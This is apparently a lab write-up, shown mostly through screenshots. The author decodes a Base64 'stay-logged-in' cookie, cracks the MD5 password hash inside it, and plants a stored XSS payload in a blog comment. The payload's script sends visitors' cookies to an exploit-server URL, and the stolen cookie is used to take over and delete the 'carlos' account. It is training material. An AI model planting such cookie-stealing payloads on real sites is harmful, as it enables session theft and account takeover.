**Authentication Vulnerabilities - Lab #10 Offline password cracking**

<img width="875" height="420" alt="image" src="https://github.com/user-attachments/assets/415e5e7b-fb1d-405f-9d1b-f8304e3a1e28" />

Lets start the lab and login with the credentials provided

<img width="725" height="406" alt="image" src="https://github.com/user-attachments/assets/1c13c4a5-1402-469a-b4d8-d6a08c6c63b2" />

Lets capture this traffic

<img width="900" height="364" alt="image" src="https://github.com/user-attachments/assets/19293c17-bb61-433d-90ac-9516cc292a7c" />

We can see that we got a 302 responce which is redirecting to /my-account page. We have two cookie set, one is stay-logged-in and other is session.

Stay logged in cookie is encoded, Lets decode it

<img width="900" height="283" alt="image" src="https://github.com/user-attachments/assets/ae6f74c4-af89-4fce-a514-4a4888c77ea6" />

We have decoded in Base64 and we got wiener:51dc30ddc473d43a6011e9ebba6ca770. It seems its username and password. Lets decode the password.

<img width="900" height="355" alt="image" src="https://github.com/user-attachments/assets/14c42991-ae54-46cd-85c4-15a46e9d3a70" />

We got the password i.e peter.

As per lab description, this application is vulnerable to XSS as well.

Lets logout and look a place where we can input some characters

<img width="611" height="562" alt="image" src="https://github.com/user-attachments/assets/70eddc99-e77a-4bdd-8cbd-c22f35a29208" />

Lets put our payload in the comment section

<img width="900" height="645" alt="image" src="https://github.com/user-attachments/assets/161101ee-2ab6-4113-a3c5-fbd1db029d5f" />

When we post the command and click back we got a pop up

<img width="900" height="287" alt="image" src="https://github.com/user-attachments/assets/94f1fc6c-5906-486f-ad92-b09888c15989" />

It confirms that this application is vulnerable to XSS

Now, we will put a XSS payload that steels the session cookie of any user that's login

<img width="900" height="292" alt="image" src="https://github.com/user-attachments/assets/d78bf7f0-ba7a-4563-9453-6ad33c2adb9e" />

This is the URL https://exploit-0ac0001703f62a9980bb119101d600d1.exploit-server.net/exploit

Now we will create a script that will send all the logs to the exploit server when any user loging.

**document.location** is used to forward the logs to a different location.

***<script>document.location='https://exploit-0ac0001703f62a9980bb119101d600d1.exploit-server.net/exploit'+document.cookie</script>***

So, when any user will login, all logs will be forwarded to the exploit URL

<img width="900" height="700" alt="image" src="https://github.com/user-attachments/assets/d017bc81-229d-4141-b476-c302657f2106" />

<img width="900" height="280" alt="image" src="https://github.com/user-attachments/assets/a5243589-a443-4fc7-b34d-74ff2fe82f9c" />

<img width="701" height="251" alt="image" src="https://github.com/user-attachments/assets/34e07dbe-78e2-4d4d-8f1b-c46e9460e068" />

Now go to client server

<img width="900" height="287" alt="image" src="https://github.com/user-attachments/assets/035c556b-b609-4dd6-a8f8-657ae6a1fe17" />

<img width="900" height="117" alt="image" src="https://github.com/user-attachments/assets/88bd71b3-b05d-4c85-8ca0-dfd78e3388f4" />

We see that one user is logged in. 

His secret cookie is Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz

Lets decode it

<img width="900" height="291" alt="image" src="https://github.com/user-attachments/assets/d3d4c9ed-ccfd-43c1-a0f9-4e588f5e9439" />

We got carlos:26323c16d5f4dabff3bb136f2460a943

Its MD5 hash, lets crack it

<img width="900" height="320" alt="image" src="https://github.com/user-attachments/assets/f3376d32-45c4-4290-951c-5a544ec8d28c" />

We got the password i.e onceuponatime

Lets login with carlos account

<img width="900" height="377" alt="image" src="https://github.com/user-attachments/assets/1d91bb3d-99ef-4858-8813-349bccebadac" />

For solving the lab we have to delete carlos account

<img width="646" height="267" alt="image" src="https://github.com/user-attachments/assets/2f3312c4-6f58-4e09-a40e-00b2a0b68c40" />

And the Lab is solved

<img width="772" height="246" alt="image" src="https://github.com/user-attachments/assets/f059abfd-b8e0-40ae-9277-4f62823666c3" />



